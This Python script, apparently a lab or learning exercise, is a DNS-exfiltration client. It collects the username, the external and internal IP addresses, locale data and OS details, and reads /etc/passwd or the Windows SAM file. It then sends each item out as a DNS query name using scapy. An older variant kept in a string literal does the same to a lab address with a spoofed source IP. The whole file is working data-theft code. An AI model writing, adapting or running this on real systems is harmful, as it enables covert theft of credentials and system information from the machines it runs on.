import locale
import getpass
import os
import socket
import requests
from scapy.layers.dns import DNS, DNSQR
from scapy.layers.inet import UDP, IP
from scapy.sendrecv import send

DNS_PORT = 53
DNS_SERVER_IP = "127.0.0.1"


def get_username():
    username = getpass.getuser()
    return username


def get_ip():
    ip = requests.get("https://api.ipify.org").text
    return ip


def get_internal_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    ip_internal = s.getsockname()[0]
    s.close()
    return ip_internal


def get_password_file():
    if os.name == 'nt':
        password_file = ""
        try:
            with open("C:\\Windows\\System32\\config\\sam", "rb") as fp:
                password_file = fp.read().decode("utf-8", "ignore")
        except FileNotFoundError:
            pass
    else:
        password_file = ""
        try:
            with open("/etc/passwd", "r") as fp:
                password_file = fp.read()
        except FileNotFoundError:
            pass

    return password_file


def get_languages():
    languages = str(locale.locale_alias)
    return languages


def get_os_info():
    os_data = ""
    if os.name == 'nt':
        os_version = os.getwindowsversion()
        os_data = f"{os.name} {os_version.major}.{os_version.minor}.{os_version.build}"
    else:
        os_info = os.uname()
        os_data = f"{os_info.sysname} {os_info.release} {os_info.version}"
    return os_data


def send_dns_query(qname):
    ip = IP(dst=DNS_SERVER_IP)
    udp = UDP(dport=DNS_PORT)
    dns = DNS(rd=1)
    dns.qd = DNSQR(qname=qname)
    dns_request = ip / udp / dns
    send(dns_request)


def send_system_info():
    # Username
    send_dns_query(get_username())

    # External IP
    send_dns_query(get_ip())

    # Internal IP
    send_dns_query(get_internal_ip())

    # Password file
    password_file = get_password_file()
    send_dns_query(password_file)

    # Languages
    languages = get_languages()
    send_dns_query(languages)

    # OS info
    os_info = get_os_info()
    send_dns_query(os_info)


def client_connection():
    print("Hello, I am the client")
    send_system_info()
    print("Client end")


if __name__ == "__main__":
    client_connection()

'''
import locale
import sys
import os
import getpass
from requests import get
from scapy.all import *
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.inet import UDP, IP

DNS_port = 53
DNS_server_ip = "127.0.0.1"


def client_connection():
    print("Hello I am the client")
    query_packet()
    print("client end")
    return


def get_username():
    username = getpass.getuser()
    return username


def get_ip():
    ip = get("https://api.ipify.org").text
    return ip


def get_internal_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    ip_internal = s.getsockname()[0]
    s.close()

    return ip_internal


def get_password_file():
    # for windows
    if os.name == 'nt':
        fp = open("C:\\Windows\\System32\\config\\sam", "rb")
        password_file = fp.read()
        password_file.decode("utf-8", "ignore")

    # for linux
    else:
        fp = open("/etc/passwd", "r")
        password_file = fp.read()

    fp.close()

    return str(password_file)


def get_languages():
    languages = str(locale.locale_alias)
    return languages


def get_os_info():
    # Get the OS information using os.uname()
    if os.name == 'nt':
        os_name = os.name
        os_version = sys.getwindowsversion()

        os_data = os.name + " " + str(os_version[0]) + "." + str(os_version[1]) + "." + str(os_version[2])

    else:
        os_info = os.uname()
        # Extract relevant information
        os_name = os_info.sysname
        os_version = os_info.version
        os_release = os_info.release
        os_data = os_name + " " + os_version + " " + os_release

    return os_data


def data_to_send():
    username = getpass.getuser()

    # for windows
    if os.name == 'nt':
        fp = open("C:\\Windows\\System32\\config\\sam", "rb")
        password_file = fp.read()
        password_file.decode("utf-8", "ignore")

    # for linux
    else:
        fp = open("/etc/passwd", "r")
        password_file = fp.read()

    fp.close()

    # ----get ip internal/external----#
    ip = get("https://api.ipify.org").text
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    ip_internal = s.getsockname()[0]
    s.close()
    # --------------------------------#

    passwords = str(password_file)

    # Get the OS information using os.uname()
    os_info = os.uname()
    # Extract relevant information
    os_name = os_info.sysname
    os_version = os_info.version
    os_release = os_info.release
    os_data = os_name + "" + os_version + "" + os_release

    data_to_send = "username: " + username + "\n" \
                   + "\n" + "external ip address: " + ip \
                   + "\n" + "internal ip address: " + ip_internal \
                   + "\n" + "Password file data:\n\n" + passwords \
                   + "\n" + "Languages: " + str(locale.locale_alias) \
                   + "\n" + "operating system: " + os_data

    return data_to_send


def query_packet():
    # -----------------IP Layer---------------#
    ip = IP()
    ip.src = "1.2.3.4"
    ip.dst = '10.0.2.5'
    # ----------------------------------------#

    # -----------------Transport Layer---------------#
    udp = UDP()
    udp.dport = 53
    # ----------------------------------------------

    # -----------------Application Layer---------------#
    dns = DNS()
    dns.id = random.randint(1, pow(2, 16) - 1)
    dns.qr = 0
    dns.opcode = 0
    dns.rd = 1
    dns.qd = DNSQR()

    print("Starting to send packets")

    # Username
    dns.qd.qname = get_username()
    dns_request = ip / udp / dns
    send(dns_request)

    print("Username sent")

    # External IP
    dns.qd.qname = get_ip()
    dns_request = ip / udp / dns
    send(dns_request)

    print("External IP sent")

    # Internal IP
    dns.qd.qname = get_internal_ip()
    dns_request = ip / udp / dns
    send(dns_request)

    print("Internal IP sent")

    # Password file
    # dns.qd.qname = get_password_file()
    # dns_request = ip / udp / dns
    # send(dns_request)
    #
    # print("Password file sent")

    # Languages
    dns.qd.qname = get_languages()
    dns_request = ip / udp / dns
    send(dns_request)

    print("Languages sent")

    # OS info
    dns.qd.qname = get_os_info()
    dns_request = ip / udp / dns
    send(dns_request)

    print("OS info sent")


if __name__ == "__main__":
    client_connection()
'''
